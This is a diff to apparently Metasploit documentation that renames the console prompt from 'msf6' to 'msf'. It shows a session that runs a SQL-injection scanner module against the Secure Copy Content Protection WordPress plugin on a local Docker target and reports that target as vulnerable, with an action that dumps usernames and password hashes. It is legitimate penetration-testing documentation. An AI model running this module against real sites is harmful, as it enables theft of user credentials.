@@ -78,12 +78,12 @@ wp_users
 
 ### Secure Copy Content Protection and Content Locking 2.8.1 on WordPress 5.9.1 on Docker
 ```
-msf6 payload(windows/x64/meterpreter/reverse_tcp) > use auxiliary/scanner/http/wp_secure_copy_content_protection_sqli
-msf6 auxiliary(scanner/http/wp_secure_copy_content_protection_sqli) > set RHOSTS 127.0.0.1
+msf payload(windows/x64/meterpreter/reverse_tcp) > use auxiliary/scanner/http/wp_secure_copy_content_protection_sqli
+msf auxiliary(scanner/http/wp_secure_copy_content_protection_sqli) > set RHOSTS 127.0.0.1
 RHOSTS => 127.0.0.1
-msf6 auxiliary(scanner/http/wp_secure_copy_content_protection_sqli) > set RPORT 8000
+msf auxiliary(scanner/http/wp_secure_copy_content_protection_sqli) > set RPORT 8000
 RPORT => 8000
-msf6 auxiliary(scanner/http/wp_secure_copy_content_protection_sqli) > show options
+msf auxiliary(scanner/http/wp_secure_copy_content_protection_sqli) > show options
 
 Module options (auxiliary/scanner/http/wp_secure_copy_content_protection_sqli):
 
@@ -107,7 +107,7 @@ Auxiliary action:
    List Users  Queries username, password hash for USER_COUNT users
 
 
-msf6 auxiliary(scanner/http/wp_secure_copy_content_protection_sqli) > run
+msf auxiliary(scanner/http/wp_secure_copy_content_protection_sqli) > run
 
 [*] Running automatic check ("set AutoCheck false" to disable)
 [+] The target appears to be vulnerable.
@@ -124,5 +124,5 @@ wp_users
 
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/http/wp_secure_copy_content_protection_sqli) >
+msf auxiliary(scanner/http/wp_secure_copy_content_protection_sqli) >
 ```
